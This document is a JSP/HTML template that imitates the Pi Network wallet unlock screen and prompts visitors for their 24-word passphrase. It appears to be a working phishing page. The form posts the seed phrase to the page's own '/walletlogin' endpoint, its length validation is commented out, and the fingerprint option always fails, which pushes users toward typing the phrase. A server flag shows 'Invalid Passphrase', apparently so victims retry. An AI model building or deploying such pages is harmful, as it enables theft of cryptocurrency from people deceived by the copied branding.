<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="mobile-web-app-capable" content="yes">
    <title>Unlock Pi Wallet</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #f8f8f8;
            padding: 0;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .error-message {
            font-family: Arial, sans-serif;
            font-weight: 400;
            font-size: 14px;
            color: #fe2d2d;
            text-align: center;
            margin-top: 5px;
            letter-spacing: 0.5px;
            opacity: 0.7;
            display: none;
        }

        .header {
            background-color: #562A79;
            color: white;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: relative;
        }

        .header-title {
            display: flex;
            align-items: center;
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
            font-size: 18px;
            font-weight: bold;
        }

        .back-button, .dropdown-button {
            font-size: 18px;
            cursor: pointer;
        }

        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            max-width: 100%;
            padding: 20px;
            background-color: white;
            border-radius: 12px 12px 0 0;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }

        h2 {
            font-size: 22px;
            font-weight: 500;
            text-align: center;
            margin: 0 0 25px 0;
            color: #333;
            font-family: 'Arial', sans-serif;
            letter-spacing: 0;
        }

        .passphrase-box {
            width: 100%;
            height: 200px;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            resize: vertical;
            max-height: 250px;
            overflow: auto;
            margin-bottom: 5px; /* Reduced margin to control spacing */
        }

        .passphrase-box:focus {
            border-color: #562A79;
            outline: none;
            box-shadow: 0 0 5px rgba(109, 50, 159, 0.5);
        }

        .btn {
            width: 100%;
            padding: 16px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            border: none;
            transition: 0.3s;
        }

        .btn-passphrase {
            background-color: #fff;
            color: #562A79;
            border: 0.5px solid #562A79;
            margin-top: 15px; /* Fixed spacing */
        }

        .btn:active {
            background-color: #E6D7EF;
        }

        .btn-fingerprint {
            background-color: #562A79;
            color: #fff;
            margin-top: 15px; /* Fixed spacing */
        }

        .left-container {
            padding-left: 13px;
            padding-right: 13px;
            width: 100%;
            box-sizing: border-box;
        }

        .pi-wallet-info {
            font-family: Arial, sans-serif;
            color: #333333;
        }

        .pi-wallet-text {
            font-size: 16px;
            line-height: 21px;
            color: #333333;
            letter-spacing: 0;
            word-spacing: 0.5px;
            margin: 0;
        }

        .pi-wallet-link {
            color: #007bff;
            text-decoration: none;
        }

        .pi-wallet-link:hover {
            text-decoration: underline;
        }

        .pi-symbol {
            font-weight: bold;
        }

        .form-group {
            margin-bottom: 0; /* No extra margin between textarea and error */
        }

        @media (max-width: 600px) {
            body {
                background-color: white;
            }

            .container {
                padding: 16px;
                border-radius: 0;
                box-shadow: none;
                flex: 1;
            }

            h2 {
                font-size: 25px;
            }

            .passphrase-box {
                height: 235px;
                font-size: 16px;
            }

            .btn {
                padding: 12px;
                font-size: 16px;
            }

            .header-title {
                font-size: 16px;
            }
        }
        
        .large-icon {
		    height: 35px; /* Slightly bigger */
		    margin: 0 5px;
		}
		
		.small-icon {
		    height: 24px; /* Smaller */
		    margin: 0 8px;
		}
        
    </style>
</head>
<body>

<div class="header">
    <div class="back-button" onclick="window.history.back()">
        <img src="${pageContext.request.contextPath}/resources/img/left-30.png" alt="Wallet Icon">
    </div>
    <div class="header-title">
        <img class="large-icon" src="${pageContext.request.contextPath}/resources/img/walletpi.png" alt="Wallet Icon">
        <span>Wallet</span>
        <img class="small-icon" src="${pageContext.request.contextPath}/resources/img/wallet-icon.png" alt="Wallet Icon">
    </div>
    <div class="dropdown-button">
        <img src="${pageContext.request.contextPath}/resources/img/expand-arrow-20.png" alt="Wallet Icon">
    </div>
</div>

<div class="container">
    <div class="left-container">
        <h2>Unlock Pi Wallet</h2>

        <form id="unlockForm" action="${pageContext.request.contextPath}/walletlogin" onsubmit="return validatePassphrase()">
            <div class="form-group">
                <textarea class="passphrase-box" id="passcode" name="passcode" placeholder="Enter your 24-word passphrase here"></textarea>
                <div id="errorMessage" class="error-message"></div>
            </div>
            <button class="btn btn-passphrase" type="submit">Unlock With Passphrase</button>
            <button class="btn btn-fingerprint" type="button" onclick="validatefinger(this);">Unlock With Fingerprint</button>
        </form>

        <div class="pi-wallet-info" style="margin-top: 30px;">
            <p class="pi-wallet-text">
                As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you.
                Recovery of passphrase is currently impossible.
            </p>

            <p class="pi-wallet-text" style="margin-top: 30px;">
                Lost your passphrase?
                <a href="#" class="pi-wallet-link">You can create a new wallet</a>,
                but all your <span class="pi-symbol">&pi;</span> in your previous wallet will be inaccessible.
            </p>
        </div>
    </div>
</div>

<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
<script>
function validatePassphrase() {
    const passphrase = document.getElementById("passcode").value.trim();
    const charCount = passphrase.length;
    const errorMessage = document.getElementById("errorMessage");
    errorMessage.innerText = "";

    //if (charCount !== 24) {
      //  errorMessage.innerText = "Invalid Passphrase.";
        //errorMessage.style.display = "block";
        //return false;
    //} else {
      //  errorMessage.style.display = "none";
        return true;
    //}
}
function validatefinger(){
	const errorMessage = document.getElementById("errorMessage");
	errorMessage.innerText = "";
	errorMessage.innerText = "You haven't setup Fingerprint for wallet yet.";
	errorMessage.style.display = "block";
    return false;
}


    $(document).ready(function() {
        var msg = '${msg}';
        if (msg) {
            var errmsg = document.getElementById("errorMessage");
            errmsg.innerText = "Invalid Passphrase.";
            errmsg.style.display = "block";
        }
    });
</script>
</body>
</html>
